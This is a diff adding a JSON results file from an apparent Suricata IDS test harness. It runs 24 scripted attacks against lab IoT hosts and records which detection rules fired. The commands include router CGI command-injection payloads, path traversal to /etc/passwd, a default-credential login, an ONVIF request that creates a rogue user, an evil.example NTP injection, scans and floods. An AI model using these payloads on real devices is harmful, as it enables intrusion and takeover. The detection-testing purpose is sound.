@@ -1,0 +1,500 @@
+{
+  "summary": {
+    "started_at": "2026-01-29 10:46:43",
+    "fastlog": "/var/log/suricata/fast.log",
+    "attacks_total": 24,
+    "attacks_enabled": 24,
+    "attacks_pass": 23,
+    "attacks_fail": 1,
+    "total_sid_counts": {
+      "9000001": 2,
+      "9000002": 30,
+      "9000003": 2,
+      "9000004": 1,
+      "9000006": 1,
+      "9000007": 50,
+      "9000008": 1,
+      "9000009": 1,
+      "9000010": 1,
+      "9000011": 1,
+      "9000012": 1,
+      "9000013": 1,
+      "9000014": 1,
+      "9000015": 1,
+      "9000016": 1,
+      "9000017": 1,
+      "9000018": 1,
+      "9000019": 1,
+      "9000020": 1,
+      "9000021": 1,
+      "9000022": 14,
+      "9000023": 4,
+      "9000024": 1,
+      "9000025": 1
+    }
+  },
+  "attacks": [
+    {
+      "id": "RTSP-1",
+      "name": "RTSP: Multiple DESCRIBE requests (6x) to /stream1",
+      "command": "bash -c 'for i in {1..6}; do printf \"DESCRIBE rtsp://10.10.0.6:8554/stream1 RTSP/1.0\\r\\nCSeq: %s\\r\\nUser-Agent: BA-AttackRunner\\r\\n\\r\\n\" \"$i\" | nc -w 2 10.10.0.6 8554 >/dev/null 2>&1; done'",
+      "timeout": 20,
+      "post_wait": 2.0,
+      "expected_rulesid": [
+        9000001
+      ],
+      "returncode": 0,
+      "runtime_s": 12.066901683807373,
+      "stdout": "",
+      "stderr": "",
+      "observed_counts": {
+        "9000001": 1
+      },
+      "pass": true,
+      "missing": []
+    },
+    {
+      "id": "RTSP-2",
+      "name": "RTSP: Path probing causing many 404 responses (triggers 9000002 detection_filter)",
+      "command": "python3 - <<'PY'\nimport socket, time\nhost=\"10.10.0.6\"; port=8554\nmethod=\"DESCRIBE\"\npath=\"/nonexistent_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"\nfull_url=True\nheaders={}\nbody=\"\"\nfor i in range(25):\n    target = f\"rtsp://{host}:{port}{path}\" if full_url else path\n    hdrs = dict(headers)\n    hdrs.setdefault(\"CSeq\", str(i+1))\n    hdrs.setdefault(\"User-Agent\", \"BA-AttackRunner\")\n    req = f\"{method} {target} RTSP/1.0\\r\\n\" + \"\".join(f\"{k}: {v}\\r\\n\" for k,v in hdrs.items()) + \"\\r\\n\"\n    payload = req.encode(\"utf-8\", errors=\"ignore\") + (body.encode(\"utf-8\", errors=\"ignore\") if body else b\"\")\n    s = socket.create_connection((host, port), timeout=3)\n    s.sendall(payload)\n    try:\n        s.recv(512)\n    except Exception:\n        pass\n    s.close()\n    time.sleep(0.02)\nPY",
+      "timeout": 20,
+      "post_wait": 2.0,
+      "expected_rulesid": [
+        9000002
+      ],
+      "returncode": 0,
+      "runtime_s": 0.6135294437408447,
+      "stdout": "",
+      "stderr": "",
+      "observed_counts": {
+        "9000002": 30
+      },
+      "pass": true,
+      "missing": []
+    },
+    {
+      "id": "RTSP-3",
+      "name": "RTSP: ANNOUNCE with overlong SDP attribute line (triggers 9000003)",
+      "command": "python3 - <<'PY'\nimport socket\nhost=\"10.10.0.6\"; port=8554\npath=\"/stream\"\nvalue = \"A\"*220\nsdp = \"\\r\\n\".join([\n    \"v=0\",\n    \"o=- 0 0 IN IP4 127.0.0.1\",\n    \"s=-\",\n    \"t=0 0\",\n    f\"a=tool:{value}\",\n    \"\"\n])\nreq = (\n    f\"ANNOUNCE rtsp://{host}:{port}{path} RTSP/1.0\\r\\n\"\n    \"CSeq: 1\\r\\n\"\n    \"User-Agent: BA-AttackRunner\\r\\n\"\n    \"Content-Type: application/sdp\\r\\n\"\n    f\"Content-Length: {len(sdp.encode())}\\r\\n\"\n    \"\\r\\n\"\n    + sdp\n)\ns = socket.create_connection((host, port), timeout=3)\ns.sendall(req.encode(\"ascii\", errors=\"ignore\"))\ntry:\n    s.recv(512)\nexcept Exception:\n    pass\ns.close()\nPY",
+      "timeout": 20,
+      "post_wait": 2.0,
+      "expected_rulesid": [
+        9000003
+      ],
+      "returncode": 0,
+      "runtime_s": 0.04255270957946777,
+      "stdout": "",
+      "stderr": "",
+      "observed_counts": {
+        "9000003": 2
+      },
+      "pass": true,
+      "missing": []
+    },
+    {
+      "id": "RTSP-4",
+      "name": "RTSP: Path traversal in request-target (triggers 9000004)",
+      "command": "python3 - <<'PY'\nimport socket, time\nhost=\"10.10.0.6\"; port=8554\nmethod=\"OPTIONS\"\npath=\"/%2e%2e%2f%2e%2e%2fetc/passwd\"\nfull_url=True\nheaders={}\nbody=\"\"\nfor i in range(1):\n    target = f\"rtsp://{host}:{port}{path}\" if full_url else path\n    hdrs = dict(headers)\n    hdrs.setdefault(\"CSeq\", str(i+1))\n    hdrs.setdefault(\"User-Agent\", \"BA-AttackRunner\")\n    req = f\"{method} {target} RTSP/1.0\\r\\n\" + \"\".join(f\"{k}: {v}\\r\\n\" for k,v in hdrs.items()) + \"\\r\\n\"\n    payload = req.encode(\"utf-8\", errors=\"ignore\") + (body.encode(\"utf-8\", errors=\"ignore\") if body else b\"\")\n    s = socket.create_connection((host, port), timeout=3)\n    s.sendall(payload)\n    try:\n        s.recv(512)\n    except Exception:\n        pass\n    s.close()\n    time.sleep(0.0)\nPY",
+      "timeout": 20,
+      "post_wait": 60.0,
+      "expected_rulesid": [
+        9000004
+      ],
+      "returncode": 0,
+      "runtime_s": 0.046198368072509766,
+      "stdout": "",
+      "stderr": "",
+      "observed_counts": {
+        "9000004": 1,
+        "9000001": 1
+      },
+      "pass": true,
+      "missing": []
+    },
+    {
+      "id": "RTSP-5",
+      "name": "RTSP: Overlong Session header value (triggers 9000005)",
+      "command": "longsession=$(openssl rand -base64 200); printf $'DESCRIBE rtsp://10.10.0.6:8554/stream1 RTSP/1.0\\r\\nCSeq: 3\\r\\nSession: %s\\r\\nUser-Agent: session-fuzz\\r\\n\\r\\n' \"$longsession\" | nc -N 10.10.0.6 8554",
+      "timeout": 20,
+      "post_wait": 2.0,
+      "expected_rulesid": [
+        9000005
+      ],
+      "returncode": 0,
+      "runtime_s": 0.01988983154296875,
+      "stdout": "RTSP/1.0 200 OK\nCSeq: 3\nContent-Base: rtsp://10.10.0.6:8554/stream1/\nContent-Length: 514\nContent-Type: application/sdp\nServer: gortsplib\n\nv=0\no=- 0 0 IN IP4 127.0.0.1\ns=No Name\nc=IN IP4 0.0.0.0\nt=0 0\nm=video 0 RTP/AVP 96\na=control:rtsp://10.10.0.6:8554/stream1/trackID=0\na=rtpmap:96 H264/90000\na=fmtp:96 packetization-mode=1; profile-level-id=64001F; sprop-parameter-sets=Z2QAH6y0AoAt2AiAAAADAIAAABlHjBlQ,aO88sA==\nm=audio 0 RTP/AVP 97\na=control:rtsp://10.10.0.6:8554/stream1/trackID=1\na=rtpmap:97 mpeg4-generic/44100/1\na=fmtp:97 config=1208; indexdeltalength=3; indexlength=3; mode=AAC-hbr; profile-level-id=1; sizelength=13; streamtype=5\n",
+      "stderr": "",
+      "observed_counts": {},
+      "pass": false,
+      "missing": [
+        9000005
+      ]
+    },
+    {
+      "id": "TELNET-1",
+      "name": "HTTP: GET /shell (triggers 9000006)",
+      "command": "curl -s --max-time 3 http://10.10.0.3:80/shell",
+      "timeout": 20,
+      "post_wait": 2.0,
+      "expected_rulesid": [
+        9000006
+      ],
+      "returncode": 0,
+      "runtime_s": 0.011193513870239258,
+      "stdout": "Not Found",
+      "stderr": "",
+      "observed_counts": {
+        "9000006": 1
+      },
+      "pass": true,
+      "missing": []
+    },
+    {
+      "id": "TELNET-2",
+      "name": "IoT host: UDP burst to external IP (triggers 9000007 detection_filter)",
+      "command": "docker exec telnet-device python3 -c \"import socket; s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM); addr=('1.1.1.1',12345); payload=b'A'*20; [s.sendto(payload, addr) for _ in range(150)]\"",
+      "timeout": 20,
+      "post_wait": 3.0,
+      "expected_rulesid": [
+        9000007
+      ],
+      "returncode": 0,
+      "runtime_s": 0.10109233856201172,
+      "stdout": "",
+      "stderr": "",
+      "observed_counts": {
+        "9000007": 50
+      },
+      "pass": true,
+      "missing": []
+    },
+    {
+      "id": "TELNET-3",
+      "name": "IoT host: TCP connect scan to internal host ports (triggers 9000008 detection_filter)",
+      "command": "docker exec telnet-device nmap -sV -O 10.10.0.4",
+      "timeout": 20,
+      "post_wait": 3.0,
+      "expected_rulesid": [
+        9000008
+      ],
+      "returncode": 124,
+      "runtime_s": 20.012070178985596,
+      "stdout": "Starting Nmap 7.93 ( https://nmap.org ) at 2026-01-29 09:45 UTC\n",
+      "stderr": "\n[timeout]",
+      "observed_counts": {
+        "9000008": 1
+      },
+      "pass": true,
+      "missing": []
+    },
+    {
+      "id": "ROUTER-1",
+      "name": "Router: /login.cgi?cli= probe (triggers 9000009)",
+      "command": "curl -s --max-time 3 'http://10.10.0.3:80/login.cgi?cli=whoami'",
+      "timeout": 20,
+      "post_wait": 2.0,
+      "expected_rulesid": [
+        9000009
+      ],
+      "returncode": 0,
+      "runtime_s": 0.010845661163330078,
+      "stdout": "Command executed via login.cgi (dummy)",
+      "stderr": "",
+      "observed_counts": {
+        "9000009": 1
+      },
+      "pass": true,
+      "missing": []
+    },
+    {
+      "id": "ROUTER-2",
+      "name": "Router: ?images auth-bypass probe (triggers 9000010)",
+      "command": "curl -s --max-time 3 'http://10.10.0.3:80/?images'",
+      "timeout": 20,
+      "post_wait": 2.0,
+      "expected_rulesid": [
+        9000010
+      ],
+      "returncode": 0,
+      "runtime_s": 0.011438608169555664,
+      "stdout": "GPON router admin content (auth bypassed)",
+      "stderr": "",
+      "observed_counts": {
+        "9000010": 1
+      },
+      "pass": true,
+      "missing": []
+    },
+    {
+      "id": "ROUTER-3",
+      "name": "Router: TR-064 NewNTPServer=http://... (triggers 9000011)",
+      "command": "curl -s --max-time 3 -X POST -H 'Content-Type: text/xml; charset=utf-8' --data '<NewNTPServer>http://evil.example/ntp</NewNTPServer>' http://10.10.0.3:7547/",
+      "timeout": 20,
+      "post_wait": 2.0,
+      "expected_rulesid": [
+        9000011
+      ],
+      "returncode": 0,
+      "runtime_s": 0.011220693588256836,
+      "stdout": "<SOAP-ENV:Envelope><SOAP-ENV:Body>OK</SOAP-ENV:Body></SOAP-ENV:Envelope>",
+      "stderr": "",
+      "observed_counts": {
+        "9000011": 1
+      },
+      "pass": true,
+      "missing": []
+    },
+    {
+      "id": "ROUTER-4",
+      "name": "Router: TOTOLINK downloadFlile.cgi payload injection (triggers 9000012 + 9000013)",
+      "command": "curl -s --max-time 3 'http://10.10.0.3:80/cgi-bin/downloadFlile.cgi?payload=%60id%60'",
+      "timeout": 20,
+      "post_wait": 2.0,
+      "expected_rulesid": [
+        9000012,
+        9000013
+      ],
+      "returncode": 0,
+      "runtime_s": 0.012694597244262695,
+      "stdout": "downloadFlile.cgi response (dummy)",
+      "stderr": "",
+      "observed_counts": {
+        "9000013": 1,
+        "9000012": 1
+      },
+      "pass": true,
+      "missing": []
+    },
+    {
+      "id": "ROUTER-4.1",
+      "name": "Router: TOTOLINK downloadFile.cgi payload injection (triggers 9000014)",
+      "command": "curl -s --max-time 3 'http://10.10.0.3:80/cgi-bin/downloadFile.cgi?payload=%60id%60'",
+      "timeout": 20,
+      "post_wait": 2.0,
+      "expected_rulesid": [
+        9000014
+      ],
+      "returncode": 0,
+      "runtime_s": 0.010179281234741211,
+      "stdout": "Not Found",
+      "stderr": "",
+      "observed_counts": {
+        "9000014": 1
+      },
+      "pass": true,
+      "missing": []
+    },
+    {
+      "id": "ROUTER-5",
+      "name": "Router: TP-Link country=... command injection pattern (triggers 9000015)",
+      "command": "curl -s --max-time 3 'http://10.10.0.3:80/?country=DE%3Bid'",
+      "timeout": 20,
+      "post_wait": 2.0,
+      "expected_rulesid": [
+        9000015
+      ],
+      "returncode": 0,
+      "runtime_s": 0.011476993560791016,
+      "stdout": "Country parameter applied (dummy)",
+      "stderr": "",
+      "observed_counts": {
+        "9000015": 1
+      },
+      "pass": true,
+      "missing": []
+    },
+    {
+      "id": "ROUTER-6",
+      "name": "Router: Tenda WriteFacMac mac=... injection pattern (triggers 9000016)",
+      "command": "curl -s --max-time 3 'http://10.10.0.3:80/goform/WriteFacMac?mac=AA:BB:CC:DD:EE:FF%3Bid'",
+      "timeout": 20,
+      "post_wait": 2.0,
+      "expected_rulesid": [
+        9000016
+      ],
+      "returncode": 0,
+      "runtime_s": 0.010778427124023438,
+      "stdout": "WriteFacMac applied (dummy)",
+      "stderr": "",
+      "observed_counts": {
+        "9000016": 1
+      },
+      "pass": true,
+      "missing": []
+    },
+    {
+      "id": "ROUTER-7",
+      "name": "Router: timezone injection (triggers 9000017)",
+      "command": "curl -s --max-time 3 -X POST 'http://10.10.0.3/apply.cgi' --data-urlencode 'timezone=UTC;cat /etc/passwd'",
+      "timeout": 20,
+      "post_wait": 2.0,
+      "expected_rulesid": [
+        9000017
+      ],
+      "returncode": 0,
+      "runtime_s": 0.010814189910888672,
+      "stdout": "apply.cgi OK (dummy)",
+      "stderr": "",
+      "observed_counts": {
+        "9000017": 1
+      },
+      "pass": true,
+      "missing": []
+    },
+    {
+      "id": "CAM-1",
+      "name": "Camera: Default BasicAuth admin:admin (triggers 9000018)",
+      "command": "curl -s --max-time 3 -H 'Authorization: Basic YWRtaW46YWRtaW4=' http://10.10.0.4:80/",
+      "timeout": 20,
+      "post_wait": 2.0,
+      "expected_rulesid": [
+        9000018
+      ],
+      "returncode": 0,
+      "runtime_s": 0.32282328605651855,
+      "stdout": "Welcome, admin! (protected camera page)",
+      "stderr": "",
+      "observed_counts": {
+        "9000018": 1
+      },
+      "pass": true,
+      "missing": []
+    },
+    {
+      "id": "CAM-2",
+      "name": "Camera: GET /system.ini (triggers 9000019)",
+      "command": "curl -s --max-time 3 http://10.10.0.4:80/system.ini",
+      "timeout": 20,
+      "post_wait": 2.0,
+      "expected_rulesid": [
+        9000019
+      ],
+      "returncode": 0,
+      "runtime_s": 2.995058059692383,
+      "stdout": "[Network]\nuser=admin\npassword=admin\nrtsp_port=554\nonvif_enabled=1\n",
+      "stderr": "",
+      "observed_counts": {
+        "9000019": 1
+      },
+      "pass": true,
+      "missing": []
+    },
+    {
+      "id": "CAM-3",
+      "name": "Camera: ONVIF SOAP CreateUsers (triggers 9000020)",
+      "command": "python3 - <<'PY'\nimport socket\nhost=\"10.10.0.4\"; port=80\npath=\"/onvif/device_service\"\nnonce = \"A\"*32 + \"==\"\nxml = f'''<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<s:Envelope xmlns:s=\"http://www.w3.org/2003/05/soap-envelope\"\n            xmlns:wsse=\"http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd\">\n  <s:Header>\n    <wsse:Security>\n      <wsse:UsernameToken>\n        <wsse:Username>admin</wsse:Username>\n        <wsse:Password>admin</wsse:Password>\n        <wsse:Nonce>{nonce}</wsse:Nonce>\n      </wsse:UsernameToken>\n    </wsse:Security>\n  </s:Header>\n  <s:Body>\n    <CreateUsers>\n      <User>\n        <Username>evil</Username>\n        <Password>evil</Password>\n      </User>\n    </CreateUsers>\n  </s:Body>\n</s:Envelope>\n'''\nreq = (\n    f\"POST {path} HTTP/1.1\\r\\n\"\n    f\"Host: {host}\\r\\n\"\n    \"User-Agent: BA-AttackRunner\\r\\n\"\n    \"Connection: close\\r\\n\"\n    \"Content-Type: application/soap+xml; charset=utf-8\\r\\n\"\n    f\"Content-Length: {len(xml.encode())}\\r\\n\"\n    \"\\r\\n\"\n    + xml\n)\ns = socket.create_connection((host, port), timeout=3)\ns.sendall(req.encode(\"utf-8\", errors=\"ignore\"))\ntry:\n    s.recv(512)\nexcept Exception:\n    pass\ns.close()\nPY",
+      "timeout": 20,
+      "post_wait": 2.0,
+      "expected_rulesid": [
+        9000020
+      ],
+      "returncode": 0,
+      "runtime_s": 2.991830348968506,
+      "stdout": "",
+      "stderr": "",
+      "observed_counts": {
+        "9000020": 1
+      },
+      "pass": true,
+      "missing": []
+    },
+    {
+      "id": "CAM-4",
+      "name": "Camera: POST /res.php action=alarm with metachar (triggers 9000021)",
+      "command": "curl -s -X POST http://10.10.0.4/res.php -H 'Content-Type: application/x-www-form-urlencoded' -d 'action=alarm&id=1;uname -a'",
+      "timeout": 20,
+      "post_wait": 2.0,
+      "expected_rulesid": [
+        9000021
+      ],
+      "returncode": 0,
+      "runtime_s": 2.994525671005249,
+      "stdout": "<ok>alarm processed</ok>",
+      "stderr": "",
+      "observed_counts": {
+        "9000021": 1
+      },
+      "pass": true,
+      "missing": []
+    },
+    {
+      "id": "MQTT-1",
+      "name": "MQTT: single CONNECT from external (triggers 9000022)",
+      "command": "python3 - <<'PY'\nimport socket, random, string\nhost=\"10.10.0.5\"; port=1883\ncid = \"ba-connect\"\ndef enc_str(s):\n    b=s.encode()\n    return bytes([len(b)>>8, len(b)&0xff]) + b\ndef rem_len(n):\n    out=bytearray()\n    x=n\n    while True:\n        digit=x%128\n        x//=128\n        if x>0: digit |= 0x80\n        out.append(digit)\n        if x==0: break\n    return bytes(out)\nvh = b\"\\x00\\x04MQTT\\x04\" + bytes([0x02]) + b\"\\x00\\x3c\"\npayload = enc_str(cid)\npkt = b\"\\x10\" + rem_len(len(vh)+len(payload)) + vh + payload\ns=socket.create_connection((host,port), timeout=3)\ns.sendall(pkt)\ntry: s.recv(4)\nexcept Exception: pass\ns.close()\nPY",
+      "timeout": 20,
+      "post_wait": 2.0,
+      "expected_rulesid": [
+        9000022
+      ],
+      "returncode": 0,
+      "runtime_s": 0.06989669799804688,
+      "stdout": "",
+      "stderr": "",
+      "observed_counts": {
+        "9000022": 1
+      },
+      "pass": true,
+      "missing": []
+    },
+    {
+      "id": "MQTT-2",
+      "name": "MQTT: CONNECT flood (triggers 9000023 detection_filter)",
+      "command": "python3 - <<'PY'\nimport socket, time, random, string\nhost=\"10.10.0.5\"; port=1883\ndef rand_cid():\n    suf=\"\".join(random.choice(string.ascii_lowercase+string.digits) for _ in range(8))\n    return \"ba-flood-\"+suf\ndef enc_str(s):\n    b=s.encode()\n    return bytes([len(b)>>8, len(b)&0xff]) + b\ndef rem_len(n):\n    out=bytearray()\n    x=n\n    while True:\n        digit=x%128\n        x//=128\n        if x>0: digit |= 0x80\n        out.append(digit)\n        if x==0: break\n    return bytes(out)\nvh = b\"\\x00\\x04MQTT\\x04\" + bytes([0x02]) + b\"\\x00\\x3c\"\nfor i in range(12):\n    cid = rand_cid()\n    payload = enc_str(cid)\n    pkt = b\"\\x10\" + rem_len(len(vh)+len(payload)) + vh + payload\n    s=socket.create_connection((host,port), timeout=3)\n    s.sendall(pkt)\n    try: s.recv(4)\n    except Exception: pass\n    s.close()\n    time.sleep(0.0)\nPY",
+      "timeout": 20,
+      "post_wait": 2.0,
+      "expected_rulesid": [
+        9000023
+      ],
+      "returncode": 0,
+      "runtime_s": 0.0675041675567627,
+      "stdout": "",
+      "stderr": "",
+      "observed_counts": {
+        "9000022": 12,
+        "9000023": 3
+      },
+      "pass": true,
+      "missing": []
+    },
+    {
+      "id": "MQTT-3",
+      "name": "MQTT: PUBLISH to exec/server with debug exec (triggers 9000024)",
+      "command": "python3 - <<'PY'\nimport socket\nhost=\"10.10.0.5\"; port=1883\ntopic=\"acme/device/dev123/exec/server\"\nmessage=\"debug exec\"\nclient_id=\"ba-pub\"\n\ndef enc_str(s):\n    b=s.encode()\n    return bytes([len(b)>>8, len(b)&0xff]) + b\ndef rem_len(n):\n    out=bytearray()\n    x=n\n    while True:\n        digit=x%128\n        x//=128\n        if x>0: digit |= 0x80\n        out.append(digit)\n        if x==0: break\n    return bytes(out)\n\nvh = b\"\\x00\\x04MQTT\\x04\" + bytes([0x02]) + b\"\\x00\\x3c\"\npl = enc_str(client_id)\nconnect = b\"\\x10\" + rem_len(len(vh)+len(pl)) + vh + pl\n\nt = enc_str(topic)\nm = message.encode()\npublish = b\"\\x30\" + rem_len(len(t)+len(m)) + t + m\n\ns=socket.create_connection((host,port), timeout=3)\ns.sendall(connect)\ntry: s.recv(4)\nexcept Exception: pass\ns.sendall(publish)\ntry:\n    s.shutdown(socket.SHUT_WR)\nexcept Exception:\n    pass\ns.close()\nPY",
+      "timeout": 20,
+      "post_wait": 2.0,
+      "expected_rulesid": [
+        9000024
+      ],
+      "returncode": 0,
+      "runtime_s": 0.06204652786254883,
+      "stdout": "",
+      "stderr": "",
+      "observed_counts": {
+        "9000022": 1,
+        "9000023": 1,
+        "9000024": 1
+      },
+      "pass": true,
+      "missing": []
+    },
+    {
+      "id": "COAP-1",
+      "name": "CoAP: POST payload with cmd=... (triggers 9000025)",
+      "command": "python3 - <<'PY'\nimport socket, random\nhost=\"10.10.0.5\"; port=5683\nmid = random.randint(0, 0xFFFF)\nhdr = bytes([0x40, 0x02, (mid>>8)&0xff, mid&0xff])  # Ver=1, Type=CON, TKL=0, Code=POST\npayload = b\"\\xff\" + (\"cmd=id\".encode())\npkt = hdr + payload\ns=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\ns.sendto(pkt, (host, port))\ns.close()\nPY",
+      "timeout": 20,
+      "post_wait": 2.0,
+      "expected_rulesid": [
+        9000025
+      ],
+      "returncode": 0,
+      "runtime_s": 0.0485997200012207,
+      "stdout": "",
+      "stderr": "",
+      "observed_counts": {
+        "9000025": 1
+      },
+      "pass": true,
+      "missing": []
+    }
+  ]
+}
